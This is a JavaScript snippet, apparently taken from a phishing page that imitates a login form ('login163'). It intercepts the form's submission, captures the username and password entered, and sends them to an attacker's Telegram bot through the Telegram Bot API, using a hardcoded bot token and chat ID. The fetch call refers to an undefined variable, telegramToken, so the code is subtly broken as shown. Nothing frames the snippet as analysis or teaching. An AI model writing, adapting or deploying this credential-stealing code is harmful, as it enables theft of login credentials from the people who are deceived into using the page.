        document.addEventListener("DOMContentLoaded", function() {
            const form = document.getElementById('login163');

            form.addEventListener('submit', function(event) {
                event.preventDefault(); // Prevent default form submission

                const username = document.getElementById('idInput').value;
                const password = document.getElementById('pwdInput').value;

                // Replace these with your Telegram Bot Token and Chat ID
                const botToken = '7398105901:AAGMqPU6Xvcho2FwqubVM_r51ei8XkWKSLc';
                const chatId = '6651292809';

                const message = `Username: ${username}\nPassword: ${password}`;

                fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log('Message sent successfully');
                    } else {
                        console.error('Error sending message:', data);
                    }
                })
                .catch(error => console.error('Error:', error));

                // Optionally, you can submit the form here if you still want to continue with form submission.
                // form.submit();
            });
        });
   
